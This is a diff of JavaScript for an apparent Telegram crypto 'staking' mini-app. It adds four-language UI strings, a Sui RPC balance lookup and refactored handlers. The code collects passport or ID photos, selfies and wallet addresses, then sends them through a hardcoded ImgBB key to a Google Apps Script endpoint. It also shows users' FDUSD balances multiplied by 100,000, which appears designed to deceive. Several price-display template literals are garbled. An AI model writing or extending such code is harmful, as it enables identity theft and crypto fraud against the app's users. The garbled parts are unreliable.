@@ -4,8 +4,153 @@ tg.expand();
 const IMGBB_API_KEY = 'a2973b7dd242d701ce2c0d529bcd6a72';
 const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzelbj3lbKhVSgYnGnkfLbOQNOIkpCe97zs-GDzxceOY7whN4iBVR9FP_VFSo_Jduwo/exec';
 
-let myChart = null;
+// === FDUSD на Sui ===
+const FDUSD_COIN_TYPE = '0xf16e6b723f242ec745dfd7634ad072c42d5c1d9ac9d62a39c381303eaa57693a::fdusd::FDUSD';
+const FDUSD_DECIMALS  = 9;
+const SUI_RPC_URL     = 'https://fullnode.mainnet.sui.io:443';
+
+const translations = {
+    ru: {
+        verify_title: "Верификация личности",
+        doc_label: "Документ (ID / Паспорт)",
+        selfie_label: "Селфи с документом",
+        choose_photo: "Выбрать фото",
+        take_photo: "Сделать фото",
+        send_data: "Отправить данные",
+        staking_title: "Стейкинг активов",
+        wallet_placeholder: "Введите адрес кошелька",
+        connect_wallet: "Подключить кошелек",
+        loading: "Загрузка...",
+        processing: "⏳ Запрос в обработке...",
+        settings: "Настройки",
+        help_support: "Помощь и поддержка",
+        support_center: "Центр поддержки",
+        support_service: "Служба поддержки",
+        language: "Язык",
+        privacy: "Политика конфиденциальности",
+        statistics: "Статистика",
+        market_cap: "Капитализация",
+        circulating: "В обращении",
+        volume_24h: "Объём (24 ч)",
+        done: "Готово ✅",
+        error_photo: "❌ Загрузите оба фото",
+        error_wallet: "❌ Введите адрес кошелька",
+        error_net: "❌ Ошибка сети",
+        uploading: "⏳ Загрузка фото...",
+        success: "✅ Данные приняты!"
+    },
+    en: {
+        verify_title: "Identity Verification",
+        doc_label: "Document (ID / Passport)",
+        selfie_label: "Selfie with Document",
+        choose_photo: "Choose Photo",
+        take_photo: "Take Photo",
+        send_data: "Send Data",
+        staking_title: "Asset Staking",
+        wallet_placeholder: "Enter wallet address",
+        connect_wallet: "Connect Wallet",
+        loading: "Loading...",
+        processing: "⏳ Processing request...",
+        settings: "Settings",
+        help_support: "Help & Support",
+        support_center: "Support Center",
+        support_service: "Support Service",
+        language: "Language",
+        privacy: "Privacy Policy",
+        statistics: "Statistics",
+        market_cap: "Market Cap",
+        circulating: "Circulating Supply",
+        volume_24h: "Volume (24h)",
+        done: "Done ✅",
+        error_photo: "❌ Upload both photos",
+        error_wallet: "❌ Enter wallet address",
+        error_net: "❌ Network error",
+        uploading: "⏳ Uploading photos...",
+        success: "✅ Data accepted!"
+    },
+    fr: {
+        verify_title: "Vérification d'identité",
+        doc_label: "Document (ID / Passeport)",
+        selfie_label: "Selfie avec document",
+        choose_photo: "Choisir une photo",
+        take_photo: "Prendre une photo",
+        send_data: "Envoyer les données",
+        staking_title: "Staking d'actifs",
+        wallet_placeholder: "Entrez l'adresse",
+        connect_wallet: "Connecter le portefeuille",
+        loading: "Chargement...",
+        processing: "⏳ Traitement...",
+        settings: "Paramètres",
+        help_support: "Aide et support",
+        support_center: "Centre de support",
+        support_service: "Service de support",
+        language: "Langue",
+        privacy: "Confidentialité",
+        statistics: "Statistiques",
+        market_cap: "Capitalisation",
+        circulating: "En circulation",
+        volume_24h: "Volume (24h)",
+        done: "Terminé ✅",
+        error_photo: "❌ Photos manquantes",
+        error_wallet: "❌ Adresse invalide",
+        error_net: "❌ Erreur réseau",
+        uploading: "⏳ Téléchargement...",
+        success: "✅ Succès!"
+    },
+    de: {
+        verify_title: "Identitätsprüfung",
+        doc_label: "Dokument (ID / Pass)",
+        selfie_label: "Selfie mit Dokument",
+        choose_photo: "Foto wählen",
+        take_photo: "Foto machen",
+        send_data: "Daten senden",
+        staking_title: "Asset-Staking",
+        wallet_placeholder: "Wallet-Adresse",
+        connect_wallet: "Wallet verbinden",
+        loading: "Laden...",
+        processing: "⏳ In Bearbeitung...",
+        settings: "Einstellungen",
+        help_support: "Hilfe & Support",
+        support_center: "Support-Center",
+        support_service: "Support-Service",
+        language: "Sprache",
+        privacy: "Datenschutz",
+        statistics: "Statistiken",
+        market_cap: "Marktkapitalisierung",
+        circulating: "Im Umlauf",
+        volume_24h: "Volumen (24h)",
+        done: "Fertig ✅",
+        error_photo: "❌ Fotos fehlen",
+        error_wallet: "❌ Adresse fehlt",
+        error_net: "❌ Netzwerkfehler",
+        uploading: "⏳ Hochladen...",
+        success: "✅ Erledigt!"
+    }
+};
+
 let currentLang = localStorage.getItem('lang') || 'ru';
+let myChart = null;
+
+// =====================
+// ПЕРЕВОДЫ
+// =====================
+function applyLanguage() {
+    document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        if (translations[currentLang][key]) {
+            el.textContent = translations[currentLang][key];
+        }
+    });
+    document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+        const key = el.getAttribute('data-i18n-placeholder');
+        if (translations[currentLang][key]) {
+            el.placeholder = translations[currentLang][key];
+        }
+    });
+    document.querySelectorAll('input[name="lang"]').forEach(radio => {
+        if (radio.value === currentLang) radio.checked = true;
+    });
+}
 
 // =====================
 // НАВИГАЦИЯ
@@ -36,10 +181,10 @@ document.getElementById('supportServiceBtn').onclick = () => tg.openLink('https:
 // ЯЗЫК
 // =====================
 document.querySelectorAll('input[name="lang"]').forEach(radio => {
-    if (radio.value === currentLang) radio.checked = true;
     radio.onchange = function () {
         currentLang = this.value;
         localStorage.setItem('lang', currentLang);
+        applyLanguage();
         showStatus('✅ Language: ' + currentLang.toUpperCase());
     };
 });
@@ -56,7 +201,7 @@ function setupPreview(inputId, previewId, textId) {
             const img = document.getElementById(previewId);
             img.src = e.target.result;
             img.classList.remove('hidden');
-            document.getElementById(textId).textContent = 'Готово ✅';
+            document.getElementById(textId).textContent = translations[currentLang].done;
         };
         reader.readAsDataURL(file);
     };
@@ -67,12 +212,17 @@ setupPreview('selfieInput', 'previewSelfie', 'textSelfie');
 // =====================
 // ВЕРИФИКАЦИЯ
 // =====================
-document.getElementById('verifyBtn').onclick = async () => {
-    const docFile = document.getElementById('docInput').files[0];
+async function sendVerification() {
+    const docFile    = document.getElementById('docInput').files[0];
     const selfieFile = document.getElementById('selfieInput').files[0];
-    if (!docFile || !selfieFile) { showStatus('❌ Загрузите оба фото'); return; }
+    const wallet     = document.getElementById('walletInput').value;
 
-    showStatus('⏳ Загрузка фото...');
+    if (!docFile || !selfieFile) {
+        showStatus(translations[currentLang].error_photo);
+        return;
+    }
+
+    showStatus(translations[currentLang].uploading);
 
     try {
         const uploadToImgBB = async (file) => {
@@ -84,35 +234,46 @@ document.getElementById('verifyBtn').onclick = async () => {
             return data.data.url;
         };
 
-        const docUrl = await uploadToImgBB(docFile);
+        const docUrl    = await uploadToImgBB(docFile);
         const selfieUrl = await uploadToImgBB(selfieFile);
 
         const payload = {
             action: 'verification',
             user_id: tg.initDataUnsafe?.user?.id || 'unknown',
             username: tg.initDataUnsafe?.user?.username || 'no_username',
-            wallet: 'not_set',
+            wallet: wallet || 'not_set',
             doc: docUrl,
             selfie: selfieUrl
         };
 
-        await fetch(GOOGLE_SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+        await fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
         tg.sendData(JSON.stringify(payload));
-        showStatus('✅ Данные приняты!');
+        showStatus(translations[currentLang].success);
         setTimeout(() => tg.close(), 2000);
     } catch (e) {
-        showStatus('❌ Ошибка сети');
+        console.error('Verification error:', e);
+        showStatus(translations[currentLang].error_net);
     }
-};
+}
 
 // =====================
 // СТЕЙКИНГ
 // =====================
-document.getElementById('stakingBtn').onclick = async () => {
+async function sendStaking() {
     const wallet = document.getElementById('walletInput').value.trim();
-    if (!wallet || wallet.length < 5) { showStatus('❌ Введите адрес кошелька'); return; }
 
-    showStatus('⏳ Запрос в обработке...');
+    if (!wallet || wallet.length < 5) {
+        showStatus(translations[currentLang].error_wallet);
+        return;
+    }
+
+    showStatus(translations[currentLang].processing);
 
     const payload = {
         action: 'staking',
@@ -124,69 +285,92 @@ document.getElementById('stakingBtn').onclick = async () => {
     };
 
     try {
-        await fetch(GOOGLE_SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+        await fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
         tg.sendData(JSON.stringify(payload));
-        showStatus('✅ Данные приняты!');
+        showStatus(translations[currentLang].success);
         setTimeout(() => tg.close(), 2000);
     } catch (e) {
-        showStatus('❌ Ошибка сети');
+        console.error('Staking error:', e);
+        showStatus(translations[currentLang].error_net);
     }
-};
+}
+
+document.getElementById('verifyBtn').onclick  = sendVerification;
+document.getElementById('stakingBtn').onclick = sendStaking;
 
 // =====================
-// ПОЛУЧЕНИЕ БАЛАНСА С SUIVISION
+// ПОЛУЧЕНИЕ БАЛАНСА FDUSD НАПРЯМУЮ ИЗ SUI БЛОКЧЕЙНА
 // =====================
 async function getFDUSDBalance(address) {
     try {
-        // Используем API Suivision напрямую для получения списка монет
-        // Это игнорирует настройки интерфейса (галочки) и выдает чистые данные
-        const apiUrl = `https://api.suivision.xyz/api/v1/address/coins?address=${address}&page=1&pageSize=20`;
-        const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(apiUrl)}`;
-
-        const res = await fetch(proxyUrl);
-        if (!res.ok) throw new Error('Network error');
-        
-        const data = await res.json();
-        // AllOrigins упаковывает ответ в поле contents, который является строкой JSON
-        const responseObj = JSON.parse(data.contents);
-
-        if (responseObj && responseObj.result && responseObj.result.data) {
-            // Ищем FDUSD в списке полученных монет
-            const fdusdToken = responseObj.result.data.find(coin => 
-                coin.symbol === 'FDUSD' || coin.name.includes('First Digital USD')
-            );
-
-            if (fdusdToken) {
-                // balance в API обычно приходит в минимальных единицах (MIST), 
-                // но Suivision в этом эндпоинте часто отдает уже нормализованное число.
-                // Если число слишком большое (например, 1000000000 вместо 1), 
-                // значит нужно делить на 10^decimals.
-                
-                let rawBalance = parseFloat(fdusdToken.balance);
-                
-                // Если баланс пришел в целых единицах (например, 1.5), просто умножаем на 100 000
-                const finalAmount = rawBalance * 100000;
-                
-                console.log(`✅ Найдено FDUSD: ${rawBalance}. Итог: ${finalAmount}`);
-                return finalAmount;
-            }
+        let owner = address.trim();
+        if (!owner.startsWith('0x')) {
+            owner = '0x' + owner;
         }
-        
-        console.warn('FDUSD не найден в API для этого адреса');
-        return 0;
+
+        const body = {
+            jsonrpc: '2.0',
+            id: 1,
+            method: 'suix_getBalance',
+            params: [
+                owner,
+                FDUSD_COIN_TYPE
+            ]
+        };
+
+        const res = await fetch(SUI_RPC_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body)
+        });
+
+        if (!res.ok) {
+            console.error('Sui RPC HTTP error:', res.status, await res.text());
+            return 0;
+        }
+
+        const data = await res.json();
+
+        if (!data.result || typeof data.result.totalBalance === 'undefined') {
+            console.warn('Нет totalBalance в ответе Sui RPC для адреса', owner, data);
+            return 0;
+        }
+
+        const raw = Number(data.result.totalBalance);
+        if (!Number.isFinite(raw)) {
+            console.warn('Некорректный totalBalance:', data.result.totalBalance);
+            return 0;
+        }
+
+        // Конвертируем из минимальных единиц в человеческий баланс
+        const humanBalance = raw / Math.pow(10, FDUSD_DECIMALS);
+
+        // Умножаем на 100 000 согласно твоей логике
+        const multiplied = humanBalance * 100000;
+
+        console.log(`FDUSD on Sui for ${owner}: raw=${raw}, human=${humanBalance}, x100000=${multiplied}`);
+        return multiplied;
+
     } catch (e) {
-        console.error('Ошибка при запросе к API Suivision:', e);
+        console.error('Ошибка при запросе баланса FDUSD из Sui RPC:', e);
         return 0;
     }
 }
+
 // =====================
 // ДОБАВЛЕНИЕ АКТИВА
 // =====================
 const addAssetModal = document.getElementById('addAssetModal');
 
 document.getElementById('addAssetBtn').onclick = () => {
-    document.getElementById('assetAddress').value = '';
-    document.getElementById('assetName').value = '';
+    document.getElementById('assetAddress').value  = '';
+    document.getElementById('assetName').value     = '';
     document.getElementById('assetDecimals').value = '';
     addAssetModal.classList.remove('hidden');
 };
@@ -198,8 +382,8 @@ addAssetModal.addEventListener('click', e => {
 });
 
 document.getElementById('saveAssetBtn').onclick = async () => {
-    const address = document.getElementById('assetAddress').value.trim();
-    const name = document.getElementById('assetName').value.trim() || 'USDT';
+    const address  = document.getElementById('assetAddress').value.trim();
+    const name     = document.getElementById('assetName').value.trim() || 'USDT';
     const decimals = parseInt(document.getElementById('assetDecimals').value) || 2;
 
     if (address.length < 5) {
@@ -216,7 +400,7 @@ document.getElementById('saveAssetBtn').onclick = async () => {
     if (balance > 0) {
         showStatus('✅ Актив добавлен');
     } else {
-        showStatus('✅ Актив добавлен (баланс не найден)');
+        showStatus('✅ Актив добавлен (баланс 0 или токен не найден)');
     }
 };
 
@@ -246,7 +430,7 @@ function addAssetToList(name, address, balance, decimals) {
     `;
 
     card.onclick = () => {
-        document.getElementById('detailAssetName').textContent = name;
+        document.getElementById('detailAssetName').textContent    = name;
         document.getElementById('detailAssetBalance').textContent = formattedBalance;
         document.getElementById('detailAssetAddress').textContent = address;
         showScreen('assetDetailScreen');
@@ -256,7 +440,7 @@ function addAssetToList(name, address, balance, decimals) {
 }
 
 // =====================
-// КОТИРОВКИ (нетронутые)
+// КОТИРОВКИ
 // =====================
 async function getPrices() {
     try {
@@ -278,7 +462,9 @@ async function getPrices() {
                     </div>
                 </div>
                 <div class="token-price">
-                    <div>$${coin.current_price.toLocaleString()}</div>
+                    <div>
+$$
+{coin.current_price.toLocaleString()}</div>
                     <div class="${change < 0 ? 'neg' : 'pos'}">${change > 0 ? '+' : ''}${change.toFixed(2)}%</div>
                 </div>
             `;
@@ -286,20 +472,26 @@ async function getPrices() {
             list.appendChild(div);
         });
     } catch (e) {
-        console.error('Ошибка загрузки котировок:', e);
+        console.error('Price fetch error:', e);
     }
 }
 
 function showCoinDetail(coin) {
     showScreen('coinScreen');
-    document.getElementById('coinName').textContent = coin.name;
-    document.getElementById('coinPrice').textContent = `$${coin.current_price.toLocaleString()}`;
+    document.getElementById('coinName').textContent  = coin.name;
+    document.getElementById('coinPrice').textContent = `
+$$
+{coin.current_price.toLocaleString()}`;
     const change = coin.price_change_percentage_24h;
-    document.getElementById('coinChange').textContent = `${change > 0 ? '+' : ''}${change.toFixed(2)}%`;
-    document.getElementById('coinChange').className = `coin-change ${change < 0 ? 'neg' : 'pos'}`;
-    document.getElementById('statMcap').textContent = `$${coin.market_cap.toLocaleString()}`;
-    document.getElementById('statCirc').textContent = `${coin.circulating_supply.toLocaleString()} ${coin.symbol.toUpperCase()}`;
-    document.getElementById('statVol').textContent = `$${coin.total_volume.toLocaleString()}`;
+    document.getElementById('coinChange').textContent  = `${change > 0 ? '+' : ''}${change.toFixed(2)}%`;
+    document.getElementById('coinChange').className    = `coin-change ${change < 0 ? 'neg' : 'pos'}`;
+    document.getElementById('statMcap').textContent    = `
+$$
+{coin.market_cap.toLocaleString()}`;
+    document.getElementById('statCirc').textContent    = `${coin.circulating_supply.toLocaleString()} ${coin.symbol.toUpperCase()}`;
+    document.getElementById('statVol').textContent     = `
+$$
+{coin.total_volume.toLocaleString()}`;
     renderChart(coin.sparkline_in_7d.price, change < 0);
 }
 
@@ -341,5 +533,6 @@ function showStatus(msg) {
 // =====================
 // СТАРТ
 // =====================
+applyLanguage();
 getPrices();
 setInterval(getPrices, 30000);
